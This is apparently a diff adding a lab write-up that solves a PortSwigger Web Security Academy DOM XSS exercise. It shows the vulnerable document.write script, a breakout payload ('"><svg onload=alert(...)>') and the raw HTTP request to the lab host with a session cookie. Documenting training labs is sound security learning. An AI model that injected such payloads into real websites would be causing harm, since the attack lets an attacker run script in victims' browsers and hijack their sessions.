@@ -1,0 +1,36 @@
+DOM XSS in document.write sink using source location.search
+
+After we use a random string we can check the page source and see how it's used. We can notice that the search parameters are used in a script:
+
+<script>
+    function trackSearch(query) {
+        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+    }
+    var query = (new URLSearchParams(window.location.search)).get('search');
+    if(query) {
+        trackSearch(query);
+    }
+</script>
+
+So our querry is used in an image. We can simply use "> to close the element and add <svg onload=alert(1337)> to trigger an XSS, resuling in a final payload of:
+
+"><svg onload=alert(1337)>
+
+This transforms the script line into
+
+document.write('<img src=""><svg onload=alert(1)> ...
+
+Getting us our XSS.
+
+Request:
+GET /?search=%22%3E%3Csvg+onload%3Dalert%281%29%3E HTTP/1.1
+Host: acb71f0c1e93de528078217d006d008a.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: https://acb71f0c1e93de528078217d006d008a.web-security-academy.net/?search=asdf
+Cookie: session=50BOGxqGbJQVeohybHbj8Cf9KObQqkbM
+Upgrade-Insecure-Requests: 1
+
